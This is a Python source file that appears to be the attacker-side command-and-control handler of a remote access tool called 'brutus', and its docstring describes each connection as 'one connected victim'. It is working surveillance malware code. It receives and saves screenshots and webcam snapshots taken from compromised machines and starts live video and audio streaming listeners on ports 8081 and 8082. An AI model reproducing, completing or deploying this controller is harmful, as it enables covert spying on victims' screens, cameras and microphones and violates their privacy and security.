"""One connected victim — asyncio-based."""

import asyncio
import itertools

from brutus.attacker.service.audio_service import AudioService
from brutus.attacker.service.video_service import VideoService
from brutus.attacker.util import (
    CONNECTION_DISCONNECT_TEMPLATE,
    CONNECTION_LOST_TEMPLATE,
    SCREENSHOT_SAVED_TEMPLATE,
    SNAPSHOT_SAVED_TEMPLATE,
    ts,
)
from brutus.messages import Message
from brutus.protocol import async_recv_frame

_id_counter = itertools.count(1)

CONTROL_HOST = "0.0.0.0"
VIDEO_PORT = 8081
AUDIO_PORT = 8082


class Connection:
    def __init__(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        addr,
        window,
        connections: dict,
        save_dir,
    ) -> None:
        self.id = next(_id_counter)
        self.reader = reader
        self.writer = writer
        self.addr = addr
        self.window = window
        self._connections = connections
        self._save_dir = save_dir
        self._snapshot_count = 0
        self._screenshot_count = 0

    async def send(self, payload: bytes) -> None:
        from brutus.protocol import pack

        self.writer.write(pack(payload))
        await self.writer.drain()

    async def handle(self) -> None:
        """Read framed messages from the victim until disconnected."""
        try:
            while True:
                try:
                    data = await async_recv_frame(self.reader)
                except (asyncio.IncompleteReadError, ConnectionError, EOFError):
                    break

                msg = data.decode(Message.TEXT_ENCODING.value, errors="replace").strip()

                if msg == Message.STATUS_SCREENSHOT_CAPTURED.value:
                    await self._receive_file("screenshot", f"ss_{self.id}", ".png")
                elif msg == Message.STATUS_SNAPSHOT_CAPTURED.value:
                    await self._receive_file("snapshot", f"snap_{self.id}", ".png")
                elif msg == Message.STATUS_VIDEO_STREAM_STARTING.value:
                    asyncio.get_event_loop().run_in_executor(None, self._start_video_service)
                elif msg == Message.STATUS_AUDIO_STREAM_STARTING.value:
                    asyncio.get_event_loop().run_in_executor(None, self._start_audio_service)
                elif msg:
                    self.window.Output.addItem(f"[{self.id}] {msg}")
        except Exception as exc:
            self.window.Output.addItem(
                CONNECTION_LOST_TEMPLATE.format(time=ts(), addr=self.addr) + f" ({exc})"
            )
        finally:
            self._connections.pop(self.id, None)
            try:
                self.writer.close()
                await self.writer.wait_closed()
            except Exception:
                pass
            self.window.Output.addItem(
                CONNECTION_DISCONNECT_TEMPLATE.format(time=ts(), addr=self.addr)
            )

    async def _receive_file(self, kind: str, prefix: str, ext: str) -> None:
        """Read the next frame (file bytes) and save it to disk."""
        try:
            file_bytes = await async_recv_frame(self.reader)
        except Exception:
            return

        if kind == "screenshot":
            self._screenshot_count += 1
            name = f"{prefix}_{self._screenshot_count}{ext}"
            tmpl = SCREENSHOT_SAVED_TEMPLATE
        else:
            self._snapshot_count += 1
            name = f"{prefix}_{self._snapshot_count}{ext}"
            tmpl = SNAPSHOT_SAVED_TEMPLATE

        path = self._save_dir / name
        path.write_bytes(file_bytes)
        self.window.Output.addItem(tmpl.format(time=ts(), path=path))

    def _start_video_service(self) -> None:
        svc = VideoService(CONTROL_HOST, VIDEO_PORT)
        svc.start()

    def _start_audio_service(self) -> None:
        svc = AudioService(CONTROL_HOST, AUDIO_PORT)
        svc.start()
